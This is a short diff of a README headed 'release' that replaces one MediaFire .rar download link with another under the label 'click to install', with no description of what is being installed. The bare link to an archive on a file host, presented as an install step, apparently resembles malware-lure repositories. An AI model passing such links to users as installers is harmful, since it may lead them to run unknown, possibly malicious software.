@@ -1,3 +1,3 @@
 # release
-[click to install](https://www.mediafire.com/file/w2zkm8yavq3j21z/R-2-L.rar/file)
+[click to install](https://www.mediafire.com/file/tzupr4jvvqokoch/r-7-z.rar/file)
 
